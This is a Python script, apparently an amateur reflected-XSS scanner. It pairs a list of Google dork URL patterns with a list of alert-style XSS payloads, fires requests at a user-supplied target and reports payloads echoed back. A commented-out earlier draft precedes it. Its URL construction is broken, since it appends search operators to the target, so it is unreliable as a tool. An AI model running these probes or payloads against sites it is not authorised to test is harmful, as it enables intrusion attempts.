# import requests
# from bs4 import BeautifulSoup

# # List of Google dorks
# dorks = [
#     "inurl:index.php?id=",
#     "inurl:product.php?id=",
#     "inurl:category.php?id=",
#     "inurl:article.php?id=",
#     "inurl:gallery.php?id=",
#     "inurl:page.php?id=",
#     "inurl:show.php?id=",
#     "inurl:detail.php?id=",
#     "inurl:view.php?id=",
#     "inurl:newsitem.php?num=",
#     "inurl:readnews.php?id=",
#     "inurl:topic.php?ID=",
#     "inurl:forum.php?topic=",
#     "inurl:viewforum.php?id=",
#     "inurl:profile.php?id=",
#     "inurl:showthread.php?t=",
#     "inurl:member.php?action=profile&id=",
#     "inurl:productlist.php?id=",
#     "inurl:shop_category.php?id=",
#     "inurl:catalog.php?cat=",
#     # Add other dorks here
# ]

# def test_xss(url):
#     try:
#         response = requests.get(url)
#         if "<script>" in response.text:  # Simple check for <script> tag in response
#             return True
#     except requests.RequestException as e:
#         print(f"Error: {e}")
#     return False

# def main():
#     # Ask the user to input the target URL
#     base_url = input("Enter the target URL: ")

#     for dork in dorks:
#         test_url = base_url + dork + "1"  # Simple payload, you can customize this
#         if test_xss(test_url):
#             print(f"Potential XSS vulnerability found at {test_url}")

# if __name__ == "__main__":
#     main()




import requests

# List of Google dorks
dorks = [
    "inurl:index.php?id=",
    "inurl:product.php?id=",
    "inurl:category.php?id=",
    "inurl:article.php?id=",
    "inurl:gallery.php?id=",
    "inurl:page.php?id=",
    "inurl:show.php?id=",
    "inurl:detail.php?id=",
    "inurl:view.php?id=",
    "inurl:newsitem.php?num=",
    "inurl:readnews.php?id=",
    "inurl:topic.php?ID=",
    "inurl:forum.php?topic=",
    "inurl:viewforum.php?id=",
    "inurl:profile.php?id=",
    "inurl:showthread.php?t=",
    "inurl:member.php?action=profile&id=",
    "inurl:productlist.php?id=",
    "inurl:shop_category.php?id=",
    "inurl:catalog.php?cat=",
    # ... add other dorks here ...
]

# List of XSS payloads
xss_payloads = [
    "<script>alert(123);</script>",
    "<ScRipT>alert('XSS');</ScRipT>",
    "<script>alert(123)</script>",
    "<script>alert(123);</script>",
    # "<ScRipT>alert("XSS");</ScRipT>",
    "<script>alert(123)</script>",
    # "<script>alert("hellox worldss");</script>",
    "<script>alert('XSS')</script>",
    "<script>alert('XSS');</script>",
    "<script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "<script>alert(/XSS/)</script>",
    "<script>alert(/XSS/)</script>",
    "</script><script>alert(1)</script>",
    "'; alert(1);",
    "')alert(1);//",
    "<ScRiPt>alert(1)</sCriPt>",
    "<IMG SRC=jAVasCrIPt:alert('XSS')>",
    "<IMG SRC='javascript:alert('XSS');'>",
    "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
    "<IMG SRC=javascript:alert('XSS')>",   
    "<img src=xss onerror=alert(1)>",
    # Add other XSS payloads here
]

def test_xss(url):
    try:
        response = requests.get(url)
        for payload in xss_payloads:
            if payload in response.text:  # Check if the payload is reflected in the response
                print(f"Potential XSS vulnerability found with payload: {payload} at {url}")
    except requests.RequestException as e:
        print(f"Error: {e}")

def main():
    # Ask the user to input the target URL
    base_url = input("Enter the target URL: ")

    for dork in dorks:
        for payload in xss_payloads:
            test_url = base_url + dork + payload  # Construct URL with dork and payload
            test_xss(test_url)

if __name__ == "__main__":
    main()